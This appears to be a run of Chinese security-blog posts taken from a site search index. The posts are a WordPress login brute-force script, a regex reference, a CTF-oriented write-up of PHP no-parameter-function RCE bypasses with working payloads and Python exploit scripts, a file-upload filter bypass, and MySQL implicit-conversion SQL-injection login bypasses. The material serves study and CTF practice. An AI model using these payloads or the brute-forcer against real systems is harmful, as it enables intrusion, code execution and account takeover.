&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0&#x27;&#125;#访问也米欧庵后，保留cookies = requests.Session()#加个headerss.headers.update(headers)#防止报错代码try: #打开pwd.txt with open(&#x27;pwd.txt&#x27;,&#x27;r&#x27;) as f: #逐行访问并且尝试 for pwd in f: #去除每行的\\n，当你读取一行时，如果用二进制显示，会发现每行都有个\\n pwd = pwd.replace(&#x27;\\n&#x27;,&#x27;&#x27;) #print(pwd) #构造post数据，log=username,pwd=password data = &#123; &quot;log&quot;:&quot;XXX&quot;, &quot;pwd&quot;:pwd, &quot;rememberme&quot;:&quot;forever&quot; &#125; #尝试登陆 req = s.post(url,data = data) print(req.status_code) #通过某些特征判断是否登陆成功 if &#x27;欢迎使用WordPress&#x27; in req.text: print(&#x27;爆破成功，密码为:&#x27;+pwd) break#如果出错，输出具体错误except requests.RequestException as e: print(e)"},{"title":"正则表达式","date":"2020-03-20","updated":"2024-03-19","path":"2020/03/20/正则表达式/","text":"截取指定字符串的内容 1234567&gt;&gt;&gt; test=&quot;abcdefghijk&quot;&gt;&gt;&gt; pattern=re.compile(r&#x27;c(.*)h&#x27;)&gt;&gt;&gt; res=pattern.search(test)&gt;&gt;&gt; res.group(0)&#x27;cdefgh&#x27;&gt;&gt;&gt; res.group(1)&#x27;defg&#x27; group(1)是不包括用来匹配的字符串 语法 非打印字符 非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列： 字符 描述 \\cx 匹配由x指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。注意 Unicode 正则表达式会匹配全角空格符。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 特殊字符 所谓特殊字符，就是一些有特殊含义的字符，如上面说的 runoo*b 中的 *，简单的说就是表示任何字符串的意思。如果要查找字符串中的 * 符号，则需要对 * 进行转义，即在其前加一个 \\: runo\\*ob 匹配 runo*ob。 许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符&quot;转义&quot;，即，将反斜杠字符\\ 放在它们前面。下表列出了正则表达式中的特殊字符： 特别字符 描述 $ 匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\\n’ 或 ‘\\r’。要匹配 $ 字符本身，请使用 $。 ( ) 标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。 * 匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。 + 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。 . 匹配除换行符 \\n 之外的任何单字符。要匹配 . ，请使用 . 。 [ 标记一个中括号表达式的开始。要匹配 [，请使用 [。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\ 将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。‘\\n’ 匹配换行符。序列 ‘\\’ 匹配 &quot;&quot;，而 ‘(’ 则匹配 “(”。 ^ 匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。 { 标记限定符表达式的开始。要匹配 {，请使用 {。 | 指明两项之间的一个选择。要匹配 |，请使用 |。 限定符 限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 正则表达式的限定符有： 字符 描述 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，“do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 以下正则表达式匹配一个正整数，**[1-9]*设置第一个数字不是 0，[0-9] 表示任意多个数字： 1/[1-9][0-9]*/ 正则表达式 - 元字符 下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为： 字符 描述 \\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，‘n’ 匹配字符 “n”。‘\\n’ 匹配一个换行符。序列 ‘\\’ 匹配 &quot;&quot; 而 “(” 则匹配 “(”。 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\\n’ 或 ‘\\r’ 之后的位置。 $ 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\\n’ 或 ‘\\r’ 之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。 ? 匹配前面的子表达式零次或一次。例如，“do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。 {n} n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。 {n,} n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。 {n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。 ? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，‘o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。 . 匹配除换行符（\\n、\\r）之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用像&quot;(.|\\n)&quot;的模式。 (pattern) 匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(’ 或 ‘)’。 (?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。 (?=pattern) 正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“Windows(?=95|98|NT|2000)“能匹配&quot;Windows2000&quot;中的&quot;Windows”，但不能匹配&quot;Windows3.1&quot;中的&quot;Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?!pattern) 正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如&quot;Windows(?!95|98|NT|2000)“能匹配&quot;Windows3.1&quot;中的&quot;Windows”，但不能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。 (?&lt;=pattern) 反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，&quot;`(?&lt;=95 (?&lt;!pattern) 反向否定预查，与正向否定预查类似，只是方向相反。例如&quot;(?&quot;能匹配&quot;3.1Windows&quot;中的&quot;Windows&quot;，但不能匹配&quot;2000Windows&quot;中的&quot;Windows`&quot;。 x|y 匹配 x 或 y。例如，‘z|food’ 能匹配 “z” 或 “food”。‘(z|f)ood’ 则匹配 “zood” 或 “food”。 [xyz] 字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。 [^xyz] 负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、‘l’、‘i’、‘n’。 [a-z] 字符范围。匹配指定范围内的任意字符。例如，‘[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。 [^a-z] 负值字符范围。匹配任何不在指定范围内的任意字符。例如，‘[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。 \\b 匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配&quot;never&quot; 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。 \\B 匹配非单词边界。‘er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。 \\cx 匹配由 x 指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。 \\d 匹配一个数字字符。等价于 [0-9]。 \\D 匹配一个非数字字符。等价于 [^0-9]。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 \\w 匹配字母、数字、下划线。等价于’[A-Za-z0-9_]'。 \\W 匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。 \\xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，‘\\x41’ 匹配 “A”。‘\\x041’ 则等价于 ‘\\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。 \\num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，‘(.)\\1’ 匹配两个连续的相同字符。 \\n 标识一个八进制转义值或一个向后引用。如果 \\n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 \\nm 标识一个八进制转义值或一个向后引用。如果 \\nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \\nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \\nm 将匹配八进制转义值 nm。 \\nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 \\un 匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \\u00A9 匹配版权符号 (?)。"},{"title":"PHP-RCE-Bypass","date":"2020-03-19","updated":"2024-03-19","path":"2020/03/19/PHP-RCE-Bypass/","text":"无参数函数执行 https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/ 大致思路如下： 利用超全局变量进行bypass，进行RCE 进行任意文件读取 什么是无参数函数RCE 传统意义上，如果我们有 1eval($_GET[&#x27;code&#x27;]); 即代表我们拥有了一句话木马，可以进行getshell，例如 但是如果有如下限制 1if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; eval($_GET[&#x27;code&#x27;]);&#125; 我们会发现我们使用参数则无法通过正则的校验 1/[^\\W]+\\((?R)?\\)/ 而该正则，正是我们说的无参数函数的校验，其只允许执行如下格式函数 1a(b(c()));a(); 但不允许 1a(&#x27;123&#x27;); 这样一来，失去了参数，我们进行RCE的难度则会大幅上升。 而本篇文章旨在bypass这种限制，并做出一些更苛刻条件的Bypass。 法一：getenv() 查阅php手册，有非常多的超全局变量 123456789$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV 我们可以使用$_ENV，对应函数为getenv() 虽然getenv()可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题 这里可以使用方法： 效果如下 但是我不想要下标，我想要数组的值，那么我们可以使用 两者结合使用即可有如下效果 我们则可用爆破的方式获取数组中任意位置需要的值，那么即可使用getenv()，并获取指定位置的恶意参数 法二：getallheaders() 之前我们获取的是所有环境变量的列表，但其实我们并不需要这么多信息。仅仅http header即可 在apache2环境下，我们有函数getallheaders()可返回 我们可以看一下返回值 123456789array(8) &#123; [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot; [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; &#125; 我们可以看到，成功返回了http header，我们可以在header中做一些自定义的手段，例如 此时我们再将结果中的恶意命令取出 1var_dump(end(getallheaders())); 这样一来相当于我们将http header中的sky变成了我们的参数，可用其进行bypass 无参数函数执行 例如 那么可以进一步利用http header的sky属性进行rce 法三：get_defined_vars() 使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效，我们也没有更加普遍的方式呢？ 这里我们可以使用get_defined_vars()，首先看一下它的回显 发现其可以回显全局变量 1234$_GET$_POST$_FILES$_COOKIE 我们这里的选择也就具有多样性，可以利用$_GET进行RCE，例如 还是和之前的思路一样，将恶意参数取出 发现可以成功RCE 但一般网站喜欢对 123$_GET$_POST$_COOKIE 做全局过滤，所以我们可以尝试从$_FILES下手，这就需要我们自己写一个上传 可以发现空格会被替换成_，为防止干扰我们用hex编码进行RCE 最终脚本如下 1234567891011import requestsfrom io import BytesIOpayload = &quot;system(&#x27;ls /tmp&#x27;);&quot;.encode(&#x27;hex&#x27;)files = &#123; payload: BytesIO(&#x27;sky cool!&#x27;)&#125;r = requests.post(&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;, files=files, allow_redirects=False)print r.content 法四：session_id() 之前我们使用$_FILES下手，其实这里还能从$_COOKIE下手： 我们有函数 可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即hex2bin 脚本如下 12345678import requestsurl = &#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;payload = &quot;echo &#x27;sky cool&#x27;;&quot;.encode(&#x27;hex&#x27;)cookies = &#123; &#x27;PHPSESSID&#x27;:payload&#125;r = requests.get(url=url,cookies=cookies)print r.content 即可达成RCE和bypass的目的 法五：dirname() &amp; chdir() 为什么一定要RCE呢？我们能不能直接读文件？ 之前的方法都基于可以进行RCE，如果目标真的不能RCE呢？我们能不能进行任意读取？ 那么想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？ 首先，我们可以利用getcwd()获取当前目录 12?code=var_dump(getcwd());string(13) &quot;/var/www/html&quot; 那么怎么进行当前目录的目录遍历呢？ 这里用scandir()即可 123?code=var_dump(scandir(getcwd()));array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125; 那么既然不在这一层目录，如何进行目录上跳呢？ 我们用dirname()即可 123?code=var_dump(scandir(dirname(getcwd())));array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125; 那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录 1chdir ( string $directory ) : bool 将 PHP 的当前目录改为 directory。 所以我们这里在 1dirname(getcwd()) 进行如下设置即可 1chdir(dirname(getcwd())) 我们尝试读取/var/www/123 1http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 即可进行文件读取 相关题目 上海大学生网络安全大赛 ByteCTF 无参数RCE https://www.cnblogs.com/BOHB-yunying/p/11616311.html#AJ2HTQpD boring_code 1234567891011121314151617181920212223242526272829303132333435&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&#x27;/data:\\/\\//i&#x27;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&#x27;url&#x27;]))&#123; $url = $_POST[&#x27;url&#x27;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123; $code = file_get_contents($url); if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 第一层 如果不买域名（氪金）的话需要绕过filter_var和parse_url。 当时看到一篇文章（一会搬运过来或者自己复现一下），如何绕过filter_var和parse_url，在file_get_contents的情况下，可以用data://伪协议来绕过，对于这样的形式data://text/plain;base64,xxxxx，parse_url会将text作为host，并且PHP对MIME不敏感，改为这样data://baidu.com/plain;base64,xxxxx就能绕过，并且file_get_contents能直接读取到xxxx的内容。 第二层 preg_replace('/[a-z]+\\((?R)?\\)/', NULL, $code) preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code) 第一个正则,百度(?R)无果，PHP regex中显示如下 (?R)? recurses the entire pattern 意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以 无限嵌套相同的模式（无参数函数） 第二个正则，过滤了一些字符，限制你的代码执行。现在需要做的就是让其eval(code)，读取到当前文件夹下的某些东西。 给的注释，flag在index.php同目录下，www flag，而我们执行的环境是www/code/code.php 因此我们需要跨目录到上级目录 payload学习分析 payload: echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 第一层： 首先我们需要跨目录，如何获取..呢？ 1234scandir 扫描目录localeconv 函数返回一包含本地数字及货币格式信息的数组pos current的别名，输出数组中的当前元素的值(第一个元素)next 将内部指针指向数组中的下一个元素 localeconv数组的第一个元素就是. 然后用poscurrent的别名获取. scandir('.')扫描当前目录后回显是'.','..'，第二个元素是.. 再通过chdir('..')跳转到上级目录 完成第一层 第二层： 123localtime() 返回本地时间，默认为数值数组time() 返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数end() 将数组的内部指针指向最后一个元素 因为chdir()返回的是bool值，成功返回1,我们还需要继续读取 这里用到time()，直接数值扔到time()中。接下来最核心的就是chr和localtime的配合获得.的姿势 可以看到第一个参数可以默认time()，因此无影响。pos获取第一个参数秒数的值，然后用chr(秒数)，因为.的10进制ascii码为46，也就是当每分钟的46秒时候我们可以获得. 然后再次通过scandir('.')扫描当前目录，end取最后一个flag文件，因为字母排序问题，f偏后。 最后通过echo readfile()输出读取到的当前目录下的最后一个文件即flag 第二层成功。 结束。 更多的payload 对于第一层的绕过，很多是氪金的。现在看到有两种方式。 ftp协议/百度跳转来bypass compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); boring_code+ 1234567if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; 对比boring_code，额外过滤了readfile,if,time,local,sqrt等函数。 那上面我面我分析的payload就无法生效了。 这里直接发出我用的payload： 1echo(serialize(file(end(scandir(chr(ord(strrev(crypt(serialize(array(date(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))))))); payload学习分析 第一层 发现了一个file() 函数 file() 函数把整个文件读入一个数组中。 与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。 如果失败，则返回 false 既然是一个数组，我们可以用serialize序列化函数来转成一个字符串 呢么读取flag的无参数函数就有了echo(serialize(file())) 第二层 最重要的是.的获取，但是local和time都被ban了，该怎么获得.呢。 crypt(serialize(array())); 利用crypt返回一个加密的字符串，加密的字符串末尾有几率出现一个. 总共末尾会出现四种情况. 0 1 / chr(ord(strrev())) 再通过反转字符，将.反转到第一位，可以通过ord取到第一位，再通过chr转化为. ord会取字符串中的第一位转化为ascii码 第三层 其实这里我做了不必要的date()函数吃掉bool放进array中。通过实践发现 根本无需在crypt中加入serizlize(array())，直接crypt吃掉chdir即可，只需要crypt里面的是一个字符串，返回的bool值也是字符串 缩短后的payload: 1echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))))))))))); 获得.的骚姿势 Math函数 我更愿意归结于math函数而不是phpversion，即便你知道phpversion函数，通过复杂的运算，你还是需要fuzz payload: 1`ceil``(sinh(``cosh``(tan(``floor``(sqrt(``floor``(phpversion())))))))` 核心思路是 : phpversion() 函数会返回当前PHP的版本好 , 然后可以用 floor() 函数取第一位的数值( 固定为 7 ) 1floor() : 返回不大于 x 的下一个整数 , 简单的说就是向下取整 有了数字 7, 就可以通过各种数学运算拿到数字46 , 也就是ASCII字符 . 12345sqrt() : 返回一个数字的平方根tan() : 返回一个数字的正切cosh() : 返回一个数字的双曲余弦sinh() : 返回一个数字的双曲正弦ceil() : 返回不小于一个数字的下一个整数 , 也就是向上取整 经过上面这些步骤 , 能拿到数字 46 再通过 chr() 函数就可以返回 ASCII 编码为 46 的字符 , 也就为 . , 后面的步骤就和之前一样 , 跳转到根目录 , 然后读取 index.php 文件 localeconv函数 同boring_code crypt函数 首先定义一个数组 , 然后对其进行序列化操作 , 输出序列化字符串 , 这里没什么问题 . 然后就用到一个非常关键的函数 : crypt() 1crypt($str , [$salt]) : 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串 . 说起来很复杂 , 你仅需要知道它可以返回一个加密字符串 .会出现在加密字符串的末尾( 加密字符串的开头默认为 : $ ) ,scandir(getcwd()) 不能用 , 但可以用 scandir('.') hebrevc() 函数 1readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))); hebrevc() 函数把希伯来文本从右至左的流转换为左至右的流，其实也是crypt的特性，只是都是反转而已."},{"title":"文件上传总结","date":"2020-03-19","updated":"2024-03-19","path":"2020/03/19/文件上传总结/","text":"if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename)) 容易发现，匹配只匹配最后一个点的后缀，所以可以引用比较经典的解析问题sky.php/.绕过"},{"title":"Mysql隐式转化","date":"2020-03-19","updated":"2024-03-19","path":"2020/03/19/Mysql隐式转化/","text":"MySQL隐式转化整理 前几天在微博上看到一篇文章：价值百万的 MySQL 的隐式类型转换感觉写的很不错，再加上自己之前也对MySQL的隐式转化这边并不是很清楚，所以就顺势整理了一下。希望对大家有所帮助。 当我们对不同类型的值进行比较的时候，为了使得这些数值「可比较」（也可以称为类型的兼容性)，MySQL会做一些隐式转化（Implicit type conversion）。比如下面的例子： 1234mysql&gt; SELECT 1+&#x27;1&#x27;; -&gt; 2mysql&gt; SELECT CONCAT(2,&#x27; test&#x27;); -&gt; &#x27;2 test&#x27; 很明显，上面的SQL语句的执行过程中就出现了隐式转化。并且从结果们可以判断出，第一条SQL中，将字符串的“1”转换为数字1，而在第二条的SQL中，将数字2转换为字符串“2”。 MySQL也提供了CAST()函数。我们可以使用它明确的把数值转换为字符串。当使用CONCA()函数的时候，也可能会出现隐式转化，因为它希望的参数为字符串形式，但是如果我们传递的不是字符串呢： 1234mysql&gt; SELECT 38.8, CAST(38.8 AS CHAR); -&gt; 38.8, &#x27;38.8&#x27;mysql&gt; SELECT 38.8, CONCAT(38.8); -&gt; 38.8, &#x27;38.8&#x27; 隐式转化规则 官方文档中关于隐式转化的规则是如下描述的： If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed. If both arguments in a comparison operation are strings, they are compared as strings. If both arguments are integers, they are compared as integers. Hexadecimal values are treated as binary strings if not compared to a number. If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type. A single-row subquery from a table or tables is not considered a constant. For example, if a subquery returns an integer to be compared to a DATETIME value, the comparison is done as two integers. The integer is not converted to a temporal value. To compare the operands as DATETIME values, use CAST() to explicitly convert the subquery value to DATETIME. If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value. In all other cases, the arguments are compared as floating-point (real) numbers. 翻译为中文就是： 两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换 两个参数都是字符串，会按照字符串来比较，不做类型转换 两个参数都是整数，按照整数来比较，不做类型转换 十六进制的值和非数字做比较时，会被当做二进制串 有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp 有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较 所有其他情况下，两个参数都会被转换为浮点数再进行比较 注意点 安全问题：假如 password 类型为字符串，查询条件为 int 0 则会匹配上。 123456789101112131415161718192021222324mysql&gt; select * from test;+----+-------+-----------+| id | name | password |+----+-------+-----------+| 1 | test1 | password1 || 2 | test2 | password2 |+----+-------+-----------+2 rows in set (0.00 sec)mysql&gt; select * from test where name = &#x27;test1&#x27; and password = 0;+----+-------+-----------+| id | name | password |+----+-------+-----------+| 1 | test1 | password1 |+----+-------+-----------+1 row in set, 1 warning (0.00 sec)mysql&gt; show warnings;+---------+------+-----------------------------------------------+| Level | Code | Message |+---------+------+-----------------------------------------------+| Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;password1&#x27; |+---------+------+-----------------------------------------------+1 row in set (0.00 sec) 相信上面的例子，一些机灵的同学可以发现其实上面的例子也可以做sql注入。 假设网站的登录那块做的比较挫，使用下面的方式： 1SELECT * FROM users WHERE username = &#x27;$_POST[&quot;username&quot;]&#x27; AND password = &#x27;$_POST[&quot;password&quot;]&#x27; 如果username输入的是a' OR 1='1，那么password随便输入，这样就生成了下面的查询： 1SELECT * FROM users WHERE username = &#x27;a&#x27; OR 1=&#x27;1&#x27; AND password = &#x27;anyvalue&#x27; 就有可能登录系统。其实如果攻击者看过了这篇文章，那么就可以利用隐式转化来进行登录了。如下： 123456789101112131415161718mysql&gt; select * from test;+----+-------+-----------+| id | name | password |+----+-------+-----------+| 1 | test1 | password1 || 2 | test2 | password2 || 3 | aaa | aaaa || 4 | 55aaa | 55aaaa |+----+-------+-----------+4 rows in set (0.00 sec)mysql&gt; select * from test where name = &#x27;a&#x27; + &#x27;55&#x27;;+----+-------+----------+| id | name | password |+----+-------+----------+| 4 | 55aaa | 55aaaa |+----+-------+----------+1 row in set, 5 warnings (0.00 sec) 之所以出现上述的原因是因为： 123456789101112131415mysql&gt; select 